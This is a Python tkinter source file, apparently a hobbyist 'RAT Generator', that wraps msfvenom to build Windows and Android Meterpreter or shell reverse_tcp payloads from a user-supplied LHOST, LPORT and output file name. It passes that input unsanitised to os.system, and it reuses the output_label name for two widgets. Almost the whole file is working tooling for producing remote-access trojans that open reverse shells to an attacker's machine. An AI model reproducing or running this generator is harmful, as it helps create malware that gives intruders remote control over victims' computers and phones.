import tkinter as tk
import os
import time
from colorama import Fore, Style

def update_payload_list(*args):
    selected_platform = platform_var.get()
    payload_menu['menu'].delete(0, tk.END)  # Clear the current payload list

    # Update payload options based on the selected platform
    for payload in payloads[selected_platform]:
        payload_menu['menu'].add_command(label=payload, command=tk._setit(payload_var, payload))
    
    # Reset the payload to the first available option for the new platform
    payload_var.set(payloads[selected_platform][0])

def generate_payload():
    output_label.config(text="Generating payload...")
    root.update()  # Refresh the UI to display the 'Generating payload...' message

    selected_platform = platform_var.get()
    selected_payload = payload_var.get()
    lhost = lhost_entry.get()
    lport = lport_entry.get()
    output_file = output_entry.get()

    command = f"msfvenom -p {selected_payload} LHOST={lhost} LPORT={lport} -o {output_file}"

    try:
        os.system(command)
        output_label.config(text=f"Payload successfully generated! File saved as: {output_file}")
    except Exception as e:
        output_label.config(text=f"Error: {e}")

root = tk.Tk()
root.title("RAT Generator By AKM KORISHEE APURBO")
root.geometry("900x300+500+0")  # Set window size to 800x500

platforms = ["windows", "android"]
payloads = {
    "windows": ["windows/meterpreter/reverse_tcp", "windows/shell/reverse_tcp"],
    "android": ["android/meterpreter/reverse_tcp", "android/shell/reverse_tcp"]
}

label = tk.Label(root, text="KORISHEE THE CYBERMASTER", font=("Comic Sans MS", 18 , "bold"))
label.grid(row=0, column=0, columnspan=2, pady=10)

platform_label = tk.Label(root, text="Select Platform:",fg="green")
platform_label.grid(row=1, column=0)

platform_var = tk.StringVar(root)
platform_var.set(platforms[0])  # Default platform selection
platform_var.trace('w', update_payload_list)  # Update payload list when platform changes

platform_menu = tk.OptionMenu(root, platform_var, *platforms)
platform_menu.grid(row=1, column=1)
platform_menu.config(width=65)  # Set width for uniform appearance

payload_label = tk.Label(root, text="Select Payload:",fg="green")
payload_label.grid(row=2, column=0)

payload_var = tk.StringVar(root)
payload_var.set(payloads[platforms[0]][0])  # Default payload selection based on the default platform

payload_menu = tk.OptionMenu(root, payload_var, *payloads[platforms[0]])
payload_menu.grid(row=2, column=1)
payload_menu.config(width=65)  # Set width for uniform appearance

lhost_label = tk.Label(root, text="Enter LHOST:",fg="green")
lhost_label.grid(row=3, column=0)

lhost_entry = tk.Entry(root,fg="purple")
lhost_entry.grid(row=3, column=1)
lhost_entry.config(width=70)  # Set width for uniform appearance

lport_label = tk.Label(root, text="Enter LPORT:",fg="green")
lport_label.grid(row=4, column=0)

lport_entry = tk.Entry(root,fg="blue")
lport_entry.grid(row=4, column=1)
lport_entry.config(width=70)  # Set width for uniform appearance

output_label = tk.Label(root, text="Enter Output File Name With Extention:",fg="green")
output_label.grid(row=5, column=0)

output_entry = tk.Entry(root,fg="red")
output_entry.grid(row=5, column=1)
output_entry.config(width=70)  # Set width for uniform appearance

generate_button = tk.Button(root,fg="green", text="Generate Payload", command=generate_payload)
generate_button.grid(row=6, column=0, columnspan=2)

output_label = tk.Label(root,fg="green", text="")
output_label.grid(row=7, column=0, columnspan=2)

root.mainloop()
